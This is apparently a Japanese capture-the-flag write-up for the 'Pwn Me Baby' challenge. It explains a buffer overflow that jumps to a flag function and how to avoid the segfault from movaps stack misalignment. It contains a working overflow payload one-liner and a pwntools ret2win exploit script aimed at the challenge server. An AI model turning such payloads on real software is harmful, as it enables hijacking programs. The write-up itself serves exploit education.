> echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\x11\x18\x40\x00\x00\x00\x00\x00"|./main I will receive a message and do nothing else:fwectf{fake_flag}

この問題の解決方法については下記 note を参照ください。
簡易的にまとめると以下です。

- https://uchan.hateblo.jp/entry/2018/02/16/232029
  - x86-64 では、メモリと XMM0 レジスタでやりとりする命令を呼び出すとき rsp が 16byte 境界にあることを期待する
- flag 関数の 1 行目の命令で `push %rbx` がおこなわれ、 rsp が 8byte sub される
  - このとき、 rsp が 16byte 境界でなくなる
  - その状態で movaps 命令が実行されてしまいセグフォエラーが発生する

https://note.ganyariya.dev/05_CTF/(Full-Weak-Engineer-CTF-2025)-Pwn-Me-Baby-%E3%82%92%E5%AD%A6%E3%81%B3%E3%81%AA%E3%81%8C%E3%82%89%E8%A7%A3%E3%81%8F#%E3%82%BB%E3%82%B0%E3%83%95%E3%82%A9%E3%82%A8%E3%83%A9%E3%83%BC%E3%82%92%E8%A7%A3%E6%B1%BA%E3%81%97%E3%83%95%E3%83%A9%E3%82%B0%E3%82%92%E7%8D%B2%E5%BE%97%E3%81%99%E3%82%8B

```bash
Dump of assembler code for function flag:
=> 0x0000000000401810 <+0>:     push   %rbx
   0x0000000000401811 <+1>:     pxor   %xmm0,%xmm0
   0x0000000000401815 <+5>:     xor    %esi,%esi
   0x0000000000401817 <+7>:     xor    %eax,%eax
   0x0000000000401819 <+9>:     lea    0x9281a(%rip),%rdi        # 0x49403a
   0x0000000000401820 <+16>:    add    $0xffffffffffffff80,%rsp
   0x0000000000401824 <+20>:    movaps %xmm0,(%rsp)
```

よって、 push %rbx が実行されないように、 scanf で入力するアドレスを 1 つずらせばよいです。

```bash
root@pve:~/ctf/fullweakctf/pwnmebaby/dist# echo -e "aaaaaaaaaaaaaaaaaaaaaaaa\x11\x18\x40\x0\x0\x0\x0\x0" | ./main
I will receive a message and do nothing else:fwectf{fake_flag}
I will receive a message and do nothing else:Segmentation fault (core dumped)
```

pwntools を使う、かつ ROP 攻撃のパターンも note に記載しているので興味ある方はご参照ください。

```py
#!/usr/bin/env python3
from pwn import *

main_path = './main'

if len(sys.argv) == 1:
        p = remote('chal2.fwectf.com', 8000)
else:
        p = process(main_path)

elf = ELF(main_path)

# ret 命令のアドレス
ret_addr = 0x401016
flag_addr = elf.symbols['flag']

payload = b'A' * 24
payload += p64(ret_addr)
payload += p64(flag_addr)

# I will ... else: の出力を待つ
data = p.recvuntil(b'else').decode()
print(data, end='')
print(payload)

# ./main に payload を TCP で送る
p.sendline(payload)

data = p.recvline().decode().rstrip()
print(data)
```

